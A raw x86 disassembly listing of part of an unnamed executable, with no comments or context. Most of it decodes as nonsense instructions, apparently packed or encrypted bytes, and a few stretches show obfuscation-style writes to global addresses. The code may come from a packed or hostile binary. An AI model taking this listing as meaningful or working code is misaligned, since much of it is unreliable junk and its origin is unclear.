  408a5b:	xchg   edx,eax
  408a5c:	sahf   
  408a5d:	and    DWORD PTR [esi-0x5125fe9c],edi
  408a63:	sbb    DWORD PTR ds:0x187b98c6,ecx
  408a69:	cmp    al,dl
  408a6b:	mov    dh,BYTE PTR [eax+0x64]
  408a6e:	shl    ah,cl
  408a70:	mov    ebp,0xb6a929c
  408a75:	cmp    eax,ebx
  408a77:	or     DWORD PTR [ecx+ebp*4],edi
  408a7a:	aaa    
  408a7b:	cwde   
  408a7c:	push   ebp
  408a7d:	jge    0x408a4f
  408a7f:	fcom   DWORD PTR [ebx+0x77]
  408a82:	stc    
  408a83:	or     BYTE PTR [ecx+0x215d2278],cl
  408a89:	fcomp  QWORD PTR [ebp+0x3293d702]
  408a8f:	jg     0xd053d563
  408a95:	mov    dh,0xad
  408a97:	stc    
  408a98:	loope  0x408a71
  408a9a:	clc    
  408a9b:	cmp    ch,BYTE PTR [ebp+0x3ab3dd2c]
  408aa1:	dec    edi
  408aa2:	and    ch,al
  408aa4:	or     eax,0x79e004ff
  408aa9:	mov    ch,cl
  408aab:	sbb    esi,DWORD PTR [ebp-0x1c00bd05]
  408ab1:	dec    esi
  408ab2:	ret    
  408ab3:	ja     0x408af0
  408ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ab6:	jmp    0x81e004ee
  408abb:	xor    ch,BYTE PTR [ecx]
  408abd:	inc    ecx
  408abe:	push   esp
  408abf:	je     0x408a54
  408ac1:	or     DWORD PTR [ebp-0x46f83082],0x77e9390d
  408acb:	cmp    dl,ah
  408acd:	add    edi,ebx
  408acf:	lds    ecx,FWORD PTR [ebx-0x10]
  408ad2:	cld    
  408ad3:	and    edx,DWORD PTR [ebx-0x1f00f974]
  408ad9:	call   0xcd5110e1
  408ade:	sbb    eax,0x7a5ac03d
  408ae3:	xchg   ecx,eax
  408ae4:	nop
  408ae5:	pop    esp
  408ae6:	gs gs adc eax,0xa40bd89c
  408aed:	es scas eax,DWORD PTR es:[edi]
  408aef:	sar    DWORD PTR [edx-0x6eadcdf],0xa4
  408af6:	out    dx,eax
  408af7:	cdq    
  408af8:	ss fucomip st,st(4)
  408afb:	fcom   QWORD PTR [edx+0x14]
  408afe:	rol    DWORD PTR [edi],1
  408b00:	nop
  408b01:	dec    edi
  408b02:	je     0x408ab4
  408b04:	fcom   QWORD PTR [ecx+0x42ff81ce]
  408b0a:	inc    ecx
  408b0b:	cmp    DWORD PTR [ebp+0x277fb46f],edi
  408b11:	inc    ebx
  408b12:	stos   BYTE PTR es:[edi],al
  408b13:	sub    BYTE PTR [eax+0x3e07f1e4],cl
  408b19:	jecxz  0x408ada
  408b1b:	ds (bad) 
  408b1e:	mov    edi,0xedd6703a
  408b23:	push   ss
  408b24:	xlat   BYTE PTR ds:[ebx]
  408b25:	lock xchg DWORD PTR [edi+0x6d],ecx
  408b29:	popa   
  408b2a:	shl    DWORD PTR [edi],cl
  408b2c:	popf   
  408b2d:	inc    eax
  408b2e:	js     0x408b12
  408b30:	retf   0x289b
  408b33:	dec    esp
  408b34:	retf   0xe5bd
  408b37:	xchg   ecx,eax
  408b38:	out    0x64,eax
  408b3a:	mov    ebp,0x81f14217
  408b3f:	(bad)  
  408b40:	in     al,dx
  408b41:	and    BYTE PTR [edx-0x7842dc5d],0xbe
  408b48:	inc    eax
  408b49:	out    dx,eax
  408b4a:	push   ebx
  408b4b:	cmp    edx,DWORD PTR [esi+0xb153265]
  408b51:	push   ds
  408b52:	fdivp  st(4),st
  408b54:	push   edx
  408b55:	pop    edx
  408b56:	sub    eax,0xf4ef333e
  408b5b:	mov    al,0x91
  408b5d:	xchg   edx,eax
  408b5e:	cli    
  408b5f:	xchg   ecx,eax
  408b60:	andnps xmm5,XMMWORD PTR [eax+0x46]
  408b64:	loop   0x408be4
  408b66:	sub    BYTE PTR [edx],0x9b
  408b69:	lock jg 0x408aef
  408b6c:	mov    ebp,0x5f776564
  408b71:	mov    esi,0x679c443b
  408b76:	xchg   esp,eax
  408b77:	sti    
  408b78:	pop    ebp
  408b79:	pop    edi
  408b7a:	fidiv  DWORD PTR [esp+edx*8]
  408b7d:	outs   dx,DWORD PTR ds:[esi]
  408b7e:	shl    ebp,cl
  408b80:	push   esi
  408b81:	mov    BYTE PTR [edx+0x38],al
  408b84:	mov    eax,0xb852f2af
  408b89:	(bad)  
  408b8b:	ins    BYTE PTR es:[edi],dx
  408b8c:	jge    0x408bf5
  408b8e:	retf   
  408b8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b90:	inc    ebp
  408b91:	aam    0x8f
  408b93:	pop    edi
  408b94:	xchg   edx,eax
  408b95:	fstp   QWORD PTR [esi+ebp*1]
  408b98:	sbb    al,0x8a
  408b9a:	inc    edi
  408b9b:	cli    
  408b9c:	pop    es
  408b9d:	push   edi
  408b9e:	es adc ebp,eax
  408ba1:	cmp    dl,BYTE PTR [esi]
  408ba3:	outs   dx,BYTE PTR ds:[esi]
  408ba4:	jge    0x408bef
  408ba6:	clc    
  408ba7:	pop    es
  408ba8:	(bad)
  408bab:	inc    ecx
  408bac:	or     eax,0x9e199231
  408bb1:	aad    0x1a
  408bb3:	jle    0x408c12
  408bb5:	popa   
  408bb6:	jge    0x408b85
  408bb8:	xchg   edi,eax
  408bb9:	pop    eax
  408bba:	stos   DWORD PTR es:[edi],eax
  408bbb:	clc    
  408bbc:	mov    eax,0x77ee3857
  408bc1:	mov    ch,BYTE PTR [ecx-0x384e7b00]
  408bc7:	fist   WORD PTR [ebx]
  408bc9:	xchg   ecx,eax
  408bca:	repnz dec esp
  408bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bcd:	jg     0x408c32
  408bcf:	sub    BYTE PTR [esi-0x3c2724bb],ah
  408bd5:	fld    QWORD PTR [esi+0x79ff0a7c]
  408bdb:	scas   eax,DWORD PTR es:[edi]
  408bdc:	jge    0x408c17
  408bde:	inc    ebx
  408bdf:	pop    edi
  408be0:	(bad)
  408be4:	stos   BYTE PTR es:[edi],al
  408be5:	xchg   ebx,eax
  408be6:	js     0x408bb1
  408be8:	cmp    bl,BYTE PTR [edi+ebx*1]
  408beb:	mov    edi,0xedcc327f
  408bf0:	jl     0x408bca
  408bf2:	out    dx,eax
  408bf3:	imul   esi,DWORD PTR [ecx],0xa
  408bf6:	jae    0x408c3f
  408bf8:	fisttp DWORD PTR [esi+0x18]
  408bfb:	(bad)  
  408bfc:	into   
  408bfd:	outs   dx,DWORD PTR ds:[esi]
  408bfe:	xor    al,0x92
  408c00:	add    dl,BYTE PTR [esi-0x3c0528e7]
  408c06:	xor    eax,0x774d7350
  408c0b:	fadd   DWORD PTR [edi]
  408c0d:	out    dx,eax
  408c0e:	ret    0xf717
  408c11:	jno    0x408c22
  408c13:	imul   esp
  408c15:	mov    eax,0x5e88e788
  408c1a:	call   0x84bc:0xaea64eeb
  408c21:	(bad)  
  408c22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c23:	loopne 0x408c80
  408c25:	sbb    al,ch
  408c27:	leave  
  408c28:	mov    esp,0x83166993
  408c2d:	xchg   esi,eax
  408c2e:	ja     0x408bb2
  408c30:	retf   0xa083
  408c33:	es fwait
  408c35:	inc    esi
  408c36:	sub    BYTE PTR [edi],bh
  408c38:	jmp    0x408c80
  408c3a:	arpl   si,di
  408c3c:	mov    esi,0xe7836f70
  408c41:	ins    BYTE PTR es:[edi],dx
  408c42:	xchg   edi,eax
  408c43:	jmp    0x408bea
  408c45:	push   cs
  408c46:	mov    es,WORD PTR [esp+edx*8]
  408c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c4a:	mov    ch,0xf8
  408c4c:	stos   DWORD PTR es:[edi],eax
  408c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c4e:	bound  eax,QWORD PTR [ebp-0x5a]
  408c51:	jne    0x408c98
  408c57:	mov    eax,ds:0x41497e
  408c5c:	mov    eax,DWORD PTR [eax]
  408c5e:	mov    DWORD PTR ds:0x4345c3,0x3b52
  408c68:	mov    DWORD PTR [ebp-0x14],eax
  408c6b:	mov    eax,ds:0x414b86
  408c70:	mov    DWORD PTR ds:0x434587,0x120a
  408c7a:	mov    eax,DWORD PTR [eax]
  408c7c:	mov    DWORD PTR ds:0x4345b7,0x2b06
  408c86:	mov    DWORD PTR [ebp-0x18],eax
  408c89:	mov    DWORD PTR ds:0x4344ef,0x61a0
  408c93:	jmp    0x4092c1
  408c98:	mov    DWORD PTR ds:0x4345ff,0x680c
  408ca2:	cmp    edi,0x33c
  408ca8:	mov    DWORD PTR ds:0x434577,0x197
  408cb2:	jne    0x408fac
  408cb8:	jmp    0x408f40
  408cbd:	call   0x641af49f
  408cc2:	je     0x408d41
  408cc4:	fnsave [eax-0x52]
  408cc7:	inc    ecx
  408cc8:	leave  
  408cc9:	mov    esi,0x44e251b6
  408cce:	in     eax,0x7e
  408cd0:	jle    0x408cb3
  408cd2:	js     0x408d52
  408cd4:	jle    0x408cd3
  408cd6:	not    BYTE PTR [edi]
  408cd8:	lods   al,BYTE PTR ds:[esi]
  408cd9:	jmp    0x9d86caac
  408cde:	xlat   BYTE PTR ds:[ebx]
  408cdf:	sub    eax,0xfa11e84c
  408ce4:	js     0x408d64
  408ce6:	loop   0x408d23
  408ce8:	push   esi
  408ce9:	sbb    esi,DWORD PTR [edi]
  408ceb:	cmp    ebp,esp
  408ced:	pushf  
  408cee:	daa    
  408cef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cf0:	mov    esp,0xd6f6a796
  408cf5:	imul   esi,DWORD PTR [esp+edx*2-0x29],0xd77c4184
  408cfd:	or     DWORD PTR [esi+0x42cb6606],0xe1514937
  408d07:	cmc    
  408d08:	or     esp,DWORD PTR [esi-0x2499668b]
  408d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d0f:	adc    ah,BYTE PTR ds:0x54193a92
  408d15:	mov    edi,0x8f49a558
  408d1a:	jmp    0xb4487001
  408d1f:	clc    
  408d20:	dec    edx
  408d21:	ds daa 
  408d23:	stc    
  408d24:	lods   al,BYTE PTR ds:[esi]
  408d25:	jp     0x408d4e
  408d27:	scas   al,BYTE PTR es:[edi]
  408d28:	xor    ecx,DWORD PTR [ebx-0x688cd3b3]
  408d2e:	rcl    dh,1
  408d30:	lods   al,BYTE PTR ds:[esi]
  408d31:	jmp    0x408d88
  408d33:	jge    0x408ce6
  408d35:	sub    BYTE PTR [ebp+0x75],bh
  408d38:	popf   
  408d39:	mov    ds:0xb6656e6,al
  408d3e:	push   esp
  408d3f:	loope  0x408cce
  408d41:	adc    eax,0x609375c2
  408d46:	outs   dx,BYTE PTR ds:[esi]
  408d47:	push   0xdbed4363
  408d4c:	fnstsw WORD PTR [edx+0x93d7f09]
  408d52:	(bad)  
  408d53:	in     al,dx
  408d54:	fwait
  408d55:	pusha  
  408d56:	fbstp  TBYTE PTR [edi]
  408d58:	or     eax,0xcee706a6
  408d5d:	push   ss
  408d5e:	mov    ds:0x362d9775,al
  408d63:	iret   
  408d64:	ja     0x408ce9
  408d66:	xor    eax,0xad37b869
  408d6b:	popa   
  408d6c:	push   esi
  408d6d:	jecxz  0x408d18
  408d6f:	cmp    eax,0x86a55776
  408d74:	and    al,0xba
  408d76:	xchg   ebp,eax
  408d77:	jg     0x408d4a
  408d79:	rcr    BYTE PTR [edi-0x40],1
  408d7c:	loope  0x408d96
  408d7e:	xor    eax,0x1ada87eb
  408d83:	mov    dl,0x5d
  408d85:	pop    esi
  408d86:	into   
  408d87:	je     0x408dcd
  408d89:	mov    eax,DWORD PTR [eax-0x72]
  408d8c:	push   0x49
  408d8e:	xchg   ebp,eax
  408d8f:	inc    ebx
  408d90:	in     eax,0x6b
  408d92:	push   eax
  408d93:	jnp    0x408dea
  408d95:	mov    WORD PTR [esi+0x45],?
  408d98:	das    
  408d99:	xchg   ebx,eax
  408d9a:	mov    ch,0xa8
  408d9c:	cmc    
  408d9d:	mov    DWORD PTR [ecx+0x32],ebx
  408da0:	or     dl,dh
  408da2:	xacquire xchg DWORD PTR [ebp+0x328edd1a],ebx
  408da9:	inc    ebp
  408daa:	cmc    
  408dab:	mov    ds:0x3a93f9a6,al
  408db0:	cmp    edi,DWORD PTR [edx]
  408db2:	push   ebp
  408db3:	rcl    DWORD PTR [ecx-0xeb3dad7],cl
  408db9:	xor    DWORD PTR [ebx-0x4d],esp
  408dbc:	dec    ebx
  408dbd:	stc    
  408dbe:	inc    ecx
  408dbf:	push   ebp
  408dc0:	lea    eax,[bx-0x22]
  408dc4:	(bad)  
  408dc5:	adc    BYTE PTR [ecx+0x43],cl
  408dc8:	mov    DWORD PTR [edx+0x2],edx
  408dcb:	cwde   
  408dcc:	ja     0x408d79
  408dce:	xor    al,0xe0
  408dd0:	sbb    eax,0xfca5ad7b
  408dd5:	mov    eax,DWORD PTR [ecx]
  408dd7:	neg    DWORD PTR [edx-0x29]
  408dda:	jo     0x408d6c
  408ddc:	cmp    al,0x8b
  408dde:	pop    ebp
  408ddf:	rcl    DWORD PTR [ecx-0x36b139b8],cl
  408de5:	outs   dx,DWORD PTR ds:[esi]
  408de6:	xchg   esi,eax
  408de7:	int    0x84
  408de9:	iret   
  408dea:	push   edi
  408deb:	enter  0x88cf,0xef
  408def:	inc    ebp
  408df0:	cli    
  408df1:	aam    0x27
  408df3:	xchg   edx,eax
  408df4:	cmp    cl,BYTE PTR [edi+0xbf0fb14]
  408dfa:	jnp    0x408ddb
  408dfc:	cmp    BYTE PTR ss:0x50232d29,al
  408e03:	shr    bh,cl
  408e05:	les    edx,FWORD PTR [esi+esi*2+0x3281662c]
  408e0c:	(bad)  
  408e0d:	jbe    0x408e1f
  408e0f:	xor    eax,0x48064fe3
  408e14:	fsub   QWORD PTR [ebx+0x57]
  408e17:	leave  
  408e18:	and    al,0xdd
  408e1a:	mov    ds:0x36365c48,eax
  408e1f:	sub    al,0x12
  408e21:	mov    WORD PTR [eax-0x31],es
  408e24:	cli    
  408e25:	cmp    esp,eax
  408e27:	int3   
  408e28:	push   edx
  408e29:	in     al,dx
  408e2a:	adc    esp,DWORD PTR [ecx+0x55]
  408e2d:	jne    0x408e1a
  408e2f:	push   esi
  408e30:	std    
  408e31:	mov    ds:0x281d7df5,al
  408e36:	icebp  
  408e37:	mov    dh,0xbf
  408e39:	push   es
  408e3a:	addr16 pop edi
  408e3c:	imul   edi,DWORD PTR [ecx-0x14e8f8dc],0x0
  408e43:	sbb    bh,ch
  408e45:	clc    
  408e46:	loop   0x408de6
  408e48:	sar    BYTE PTR [edi],cl
  408e4a:	or     DWORD PTR [edx-0x797bcbd5],0xffffff8f
  408e51:	xor    al,0xa4
  408e53:	add    DWORD PTR [esi],esi
  408e55:	sbb    BYTE PTR [ebx+0x489f38df],cl
  408e5b:	pop    edi
  408e5c:	inc    ebp
  408e5d:	inc    ecx
  408e5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e5f:	ja     0x408e7c
  408e61:	or     BYTE PTR [eax+0x53],0x55
  408e65:	push   ecx
  408e66:	stos   BYTE PTR es:[edi],al
  408e67:	mov    dh,0xde
  408e69:	adc    DWORD PTR [eax+edx*1],0xffffffad
  408e6d:	repnz cwde 
  408e6f:	push   0x1ea22583
  408e74:	pop    esi
  408e75:	and    eax,0x57ddc978
  408e7a:	inc    ebx
  408e7b:	xor    eax,edi
  408e7d:	fdivr  st(6),st
  408e7f:	push   ss
  408e80:	pop    ecx
  408e81:	push   cs
  408e82:	inc    DWORD PTR [ecx+0x2359f069]
  408e88:	rol    DWORD PTR [edi],0xd6
  408e8b:	push   esi
  408e8c:	aam    0xd5
  408e8e:	jl     0x408e5f
  408e90:	add    BYTE PTR [ebp+esi*4+0x48],dh
  408e94:	push   ss
  408e95:	or     al,0x7f
  408e97:	xor    eax,0x6e2ee32
  408e9c:	jle    0x408ed5
  408e9e:	pop    eax
  408e9f:	add    eax,0x302ad09e
  408ea4:	xlat   BYTE PTR ds:[ebx]
  408ea5:	mov    esp,0x583f1adf
  408eaa:	add    ebp,DWORD PTR [esi+0x7c9497b]
  408eb0:	and    al,0x71
  408eb2:	loop   0x408ebc
  408eb4:	mov    dl,0x35
  408eb6:	jo     0x408e6f
  408eb8:	add    dh,bh
  408eba:	data16 jne 0x408ea6
  408ebd:	inc    ecx
  408ebe:	or     DWORD PTR [ebx+edi*8],ecx
  408ec1:	in     eax,dx
  408ec2:	fsub   DWORD PTR [eax-0x46]
  408ec5:	lods   eax,DWORD PTR ds:[esi]
  408ec6:	loopne 0x408f0e
  408ec8:	loope  0x408ee1
  408eca:	pop    ds
  408ecb:	pop    es
  408ecc:	jmp    0xa185e2e2
  408ed1:	and    esi,DWORD PTR [edx+0x3]
  408ed4:	loop   0x408ea7
  408ed6:	fist   WORD PTR [eax]
  408ed8:	add    dl,dl
  408eda:	sysexit 
  408edc:	push   ecx
  408edd:	imul   DWORD PTR [ebx]
  408edf:	ja     0x408f47
  408ee1:	push   0x822b7667
  408ee6:	sbb    BYTE PTR [ebx+0x6],dh
  408ee9:	or     ecx,ecx
  408eeb:	jg     0x408eba
  408eed:	mov    cl,0x98
  408eef:	sub    BYTE PTR [esp+edi*2+0x77],al
  408ef3:	push   eax
  408ef4:	sub    ah,dh
  408ef6:	scas   eax,DWORD PTR es:[edi]
  408ef7:	pop    edx
  408ef8:	jno    0x408f26
  408efa:	add    bl,BYTE PTR [eax+0x45]
  408efd:	inc    DWORD PTR [edi]
  408eff:	jb     0x408ecd
  408f01:	rol    DWORD PTR [esi+0x3e],cl
  408f04:	pop    es
  408f05:	sbb    al,0xea
  408f07:	into   
  408f08:	inc    ebp
  408f09:	pop    edi
  408f0a:	xchg   edi,eax
  408f0b:	fadd   QWORD PTR [ebp+0x40a4ffb1]
  408f11:	sub    eax,0x51628bc4
  408f16:	sbb    al,0xf8
  408f18:	add    ebx,DWORD PTR [ebx-0x72]
  408f1b:	xor    al,0x24
  408f1d:	inc    DWORD PTR [ecx-0x3d]
  408f20:	iret   
  408f21:	push   esp
  408f22:	in     eax,0xac
  408f24:	jnp    0x408f3e
  408f26:	xchg   esi,eax
  408f27:	xchg   ebx,eax
  408f28:	aas    
  408f29:	xchg   esi,eax
  408f2a:	push   ebp
  408f2b:	bound  eax,QWORD PTR [esi+0x48]
  408f2e:	addr16 test eax,0x4d6b03dc
  408f34:	cmp    al,0x24
  408f36:	shl    DWORD PTR [edx-0xa],cl
  408f39:	addr16 call 0x133906aa
  408f3f:	and    eax,DWORD PTR [ebx-0x74fff79b]
  408f45:	inc    ebp
  408f46:	clc    
  408f47:	or     DWORD PTR ds:0x4345c3,0x434583
  408f51:	sub    eax,DWORD PTR [ebp+0x8]
  408f54:	push   eax
  408f55:	mov    eax,ds:0x434603
  408f5a:	or     DWORD PTR ds:0x4345c3,eax
  408f60:	mov    eax,DWORD PTR [ebp-0x4]
  408f63:	add    DWORD PTR ds:0x4344df,0x43454f
  408f6d:	add    eax,DWORD PTR [ebp+0x8]
  408f70:	sub    DWORD PTR ds:0x4345c7,0x434547
  408f7a:	push   eax
  408f7b:	dec    DWORD PTR ds:0x4344eb
  408f81:	call   0x4092e7
  408f86:	mov    DWORD PTR ds:0x4345b7,0x29a7
  408f90:	inc    DWORD PTR [ebp+0x8]
  408f93:	cmp    DWORD PTR [ebp+0x8],0x52
  408f97:	mov    DWORD PTR ds:0x4344ff,0x7d48
  408fa1:	jb     0x408f44
  408fa7:	jmp    0x4092c1
  408fac:	cmp    edi,0x1a2
  408fb2:	jne    0x40928f
  408fb8:	mov    DWORD PTR [ebp-0x60],0xf89c853a
  408fbf:	mov    eax,DWORD PTR [ebp-0x4]
  408fc2:	mov    DWORD PTR [ebp-0x5c],eax
  408fc5:	mov    eax,DWORD PTR [ebp-0x8]
  408fc8:	mov    DWORD PTR [ebp-0x58],eax
  408fcb:	mov    eax,DWORD PTR [ebp-0xc]
  408fce:	jmp    0x409256
  408fd3:	mov    BYTE PTR [edi],al
  408fd5:	xchg   esi,eax
  408fd6:	jno    0x408f69
  408fd8:	jno    0x409043
  408fda:	out    0xcb,eax
  408fdc:	fisttp DWORD PTR [esi+esi*1+0x2ac4dc7f]
  408fe3:	das    
  408fe4:	loopne 0x409064
  408fe6:	jle    0x408fc9
  408fe8:	js     0x409068
  408fea:	jle    0x408fc1
  408fec:	mov    edx,0x365da3d4
  408ff1:	push   ss
  408ff2:	dec    edx
  408ff3:	push   0x26
  408ff5:	jp     0x409029
  408ff7:	daa    
  408ff8:	ret    
  408ff9:	or     al,0x38
  408ffb:	stc    
  408ffc:	pop    ebx
  408ffd:	lock pop esi
  408fff:	lea    esp,[ebx-0x39e6e46f]
  409005:	sbb    al,BYTE PTR [edi+0x20cac67e]
  40900b:	pop    edx
  40900c:	loope  0x408fca
  40900e:	inc    edi
  40900f:	test   DWORD PTR [ecx+eax*2+0x66],esp
  409013:	push   ss
  409014:	iret   
  409015:	or     BYTE PTR [eax+0x5b],ch
  409018:	dec    edx
  409019:	mov    edi,0x324a9697
  40901e:	adc    DWORD PTR [esi+0x5f7a01d2],ecx
  409024:	stc    
  409025:	or     al,BYTE PTR [ebp-0x56f5aee]
  40902b:	aad    0xb0
  40902d:	(bad)  
  40902e:	sub    eax,0x629e5bcc
  409033:	dec    eax
  409034:	adc    al,0xb7
  409036:	call   0xf88eb371
  40903b:	(bad)  
  40903c:	pop    DWORD PTR [esi]
  40903e:	into   
  40903f:	inc    edi
  409040:	push   ebx
  409041:	sbb    ch,BYTE PTR [ebx-0x727f4262]
  409047:	xchg   esp,eax
  409048:	xchg   ebx,eax
  409049:	adc    esp,DWORD PTR [ecx+0x5a]
  40904c:	sbb    esi,DWORD PTR [edi+0x6e]
  40904f:	cmp    DWORD PTR [ebx],0x5
  409052:	clc    
  409053:	imul   eax,DWORD PTR [eax+0x75328079],0x4e
  40905a:	inc    edx
  40905b:	xor    ebp,ebp
  40905d:	in     al,0xe1
  40905f:	and    edi,DWORD PTR [edi+0x3dc48bea]
  409065:	add    al,0x6b
  409067:	cmp    dh,BYTE PTR [esi+ecx*2-0x48]
  40906b:	mov    WORD PTR [edi],es
  40906d:	mov    esp,0x547a8c80
  409072:	lods   eax,DWORD PTR ds:[esi]
  409073:	hlt    
  409074:	paddsb mm7,QWORD PTR [eax*4-0x7fe4d15f]
  40907c:	pop    esi
  40907d:	mov    ebx,0xe17152e1
  409082:	jecxz  0x409057
  409084:	jp     0x4090c4
  409086:	test   DWORD PTR [ecx+eiz*4],ebp
  409089:	shl    al,cl
  40908b:	and    DWORD PTR [ecx+0x6df199ae],ecx
  409091:	add    bl,BYTE PTR [ebx-0x52]
  409094:	(bad)  
  409095:	stos   BYTE PTR es:[edi],al
  409096:	in     al,dx
  409097:	shl    DWORD PTR [esi+0x67],1
  40909a:	addr16 sbb al,0xf9
  40909d:	pop    esp
  40909e:	ins    BYTE PTR es:[edi],dx
  40909f:	out    0xa,eax
  4090a1:	adc    BYTE PTR [ebx-0x51f70371],dh
  4090a7:	aad    0xd3
  4090a9:	mov    es,WORD PTR [ebx-0x7c]
  4090ac:	mov    esp,DWORD PTR [ebx]
  4090ae:	and    DWORD PTR [edi+0x584a0a7c],eax
  4090b4:	fistp  QWORD PTR [edx+0x68f68efc]
  4090ba:	aad    0x5f
  4090bc:	push   ebp
  4090bd:	into   
  4090be:	pop    esi
  4090bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090c0:	xchg   ebx,eax
  4090c1:	sub    eax,0xe9c10db5
  4090c6:	pop    ecx
  4090c7:	sub    dh,bh
  4090c9:	cmp    eax,0x88e9ece4
  4090ce:	add    edx,DWORD PTR ds:0x91b2a954
  4090d4:	fcmovbe st,st(5)
  4090d6:	(bad)  
  4090d7:	mov    esi,0x7cca1e05
  4090dc:	xor    ebp,ecx
  4090de:	out    0x6a,al
  4090e0:	push   edx
  4090e1:	xchg   DWORD PTR [eax],esi
  4090e3:	inc    ebp
  4090e4:	(bad)  
  4090e5:	sahf   
  4090e6:	mov    edi,0x11544ead
  4090eb:	add    al,0xd
  4090ed:	mov    ds:0x331b7277,eax
  4090f2:	dec    esp
  4090f3:	adc    al,0xe3
  4090f5:	inc    esi
  4090f6:	xor    eax,0x4745d4ba
  4090fb:	xchg   ebp,eax
  4090fc:	mov    dl,BYTE PTR [ebx]
  4090fe:	ds scas eax,DWORD PTR es:[edi]
  409100:	jmp    0xeffcfb55
  409105:	or     cl,BYTE PTR [ebx+ecx*4]
  409108:	mov    ebp,0xe0009ccc
  40910d:	mov    ebx,0x99953b4d
  409112:	push   esp
  409113:	cmovns ebx,DWORD PTR [edx-0x28]
  409117:	mov    ebx,0xb6cd8a3a
  40911c:	pop    ecx
  40911d:	jp     0x409165
  40911f:	dec    ebp
  409120:	jmp    0x4090b9
  409122:	imul   eax,DWORD PTR [ecx+0x20056972],0xffffffdb
  409129:	imul   BYTE PTR [ebx]
  40912b:	jl     0x40918e
  40912d:	or     DWORD PTR [esi+0x11],ecx
  409130:	and    al,0x3c
  409132:	sub    eax,0xd02a989e
  409137:	out    dx,al
  409138:	neg    BYTE PTR [edi-0x7c]
  40913b:	push   0x686d5570
  409140:	hlt    
  409141:	in     al,0x8f
  409143:	(bad)  
  409144:	mov    ebp,0xc877b8bd
  409149:	xchg   ecx,eax
  40914a:	pushf  
  40914b:	jecxz  0x40915f
  40914d:	ds push eax
  40914f:	cmp    ebp,DWORD PTR [esi]
  409151:	fisub  WORD PTR [esp+ecx*2]
  409154:	ja     0x409111
  409156:	or     bh,BYTE PTR [ecx]
  409158:	stos   DWORD PTR es:[edi],eax
  409159:	jb     0x4090ed
  40915b:	and    dh,BYTE PTR [edi*4+0x3dc0ee11]
  409162:	adc    eax,0x9bf547f1
  409167:	cmp    BYTE PTR [eax+eiz*8],0x8c
  40916b:	cmp    eax,0x3fe6502e
  409170:	xchg   ebp,eax
  409171:	inc    esi
  409172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409173:	push   es
  409174:	jns    0x409119
  409176:	aaa    
  409177:	sbb    ebp,DWORD PTR [eax]
  409179:	sub    BYTE PTR [ebx],ah
  40917b:	in     eax,0x13
  40917d:	push   es
  40917e:	inc    ebx
  40917f:	mov    eax,0x99707cbf
  409184:	push   ebx
  409185:	cld    
  409186:	call   0xdf52b667
  40918b:	ficomp DWORD PTR [edx]
  40918d:	nop
  40918e:	test   eax,0xb17d1eb1
  409193:	pusha  
  409194:	scas   eax,DWORD PTR es:[edi]
  409195:	jno    0x40912b
  409197:	or     al,0x27
  409199:	lea    edi,[eax]
  40919b:	repnz push edx
  40919d:	outs   dx,DWORD PTR ds:[esi]
  40919e:	(bad)  
  40919f:	std    
  4091a0:	xor    al,BYTE PTR [ebp-0x34]
  4091a3:	add    ecx,ecx
  4091a5:	es pop ebp
  4091a7:	call   0x4f9b:0x108ec990
  4091ae:	jecxz  0x409197
  4091b0:	(bad)  
  4091b1:	aaa    
  4091b2:	sbb    dh,dh
  4091b4:	icebp  
  4091b5:	or     al,0xa8
  4091b7:	mov    bh,0xb2
  4091b9:	adc    bh,dl
  4091bb:	(bad)  
  4091bc:	out    dx,al
  4091bd:	or     DWORD PTR [eax],edx
  4091bf:	enter  0xc103,0x95
  4091c3:	(bad)  
  4091c4:	imul   eax,DWORD PTR [ebp-0x15d24bc],0x60
  4091cb:	cld    
  4091cc:	xor    DWORD PTR [eax+0x2c],eax
  4091cf:	add    ebp,esp
  4091d1:	pop    edi
  4091d2:	mov    cl,0x5d
  4091d4:	das    
  4091d5:	fadd   QWORD PTR [ecx]
  4091d7:	mov    esi,0x1fad8f1
  4091dc:	push   ecx
  4091dd:	dec    ecx
  4091de:	adc    eax,0x6984a7a0
  4091e3:	in     al,0x3a
  4091e5:	xchg   bl,ah
  4091e7:	jmp    0x9c40:0xbce1d8d0
  4091ee:	aaa    
  4091ef:	mov    ebp,ebp
  4091f1:	std    
  4091f2:	dec    ecx
  4091f3:	imul   eax,DWORD PTR [ebp+0x62],0x695363
  4091fa:	lahf   
  4091fb:	(bad)  
  4091fc:	out    dx,eax
  4091fd:	lahf   
  4091fe:	loopne 0x4091f7
  409200:	scas   eax,DWORD PTR es:[edi]
  409201:	xlat   BYTE PTR ds:[ebx]
  409202:	add    dh,ch
  409204:	inc    ebx
  409205:	add    ah,BYTE PTR [ecx+ebp*1+0x54]
  409209:	cli    
  40920a:	icebp  
  40920b:	imul   edi,DWORD PTR [esi+0x210da263],0xc8b72577
  409215:	and    al,0xfc
  409217:	packsswb mm4,QWORD PTR [eax+0xa]
  40921b:	push   ecx
  40921c:	sub    bh,ch
  40921e:	je     0x409293
  409220:	mov    edi,0x7667e8de
  409225:	fld    st(0)
  409227:	xchg   esi,eax
  409228:	mov    ecx,0x4a6d9692
  40922d:	mov    ecx,0x135797f2
  409232:	ins    BYTE PTR es:[edi],dx
  409233:	call   0x21b6:0x18b8864c
  40923a:	pop    ds
  40923b:	shl    DWORD PTR ds:0x36867113,1
  409241:	cmp    eax,0xc0c205df
  409246:	xor    eax,0x8597d83d
  40924b:	sbb    cl,BYTE PTR [eax]
  40924d:	jnp    0x4092ac
  40924f:	mov    ebp,0xa8a6c902
  409254:	int3   
  409255:	cmp    DWORD PTR [ebx],esi
  409257:	mov    BYTE PTR [ebx],0xc3
  40925a:	mov    DWORD PTR [ebp-0x54],eax
  40925d:	lea    eax,[ebp-0x1c]
  409260:	mov    DWORD PTR [ebp-0x50],eax
  409263:	mov    eax,DWORD PTR [ebp-0x60]
  409266:	xor    eax,esi
  409268:	add    eax,ebx
  40926a:	mov    DWORD PTR [ebp-0x60],eax
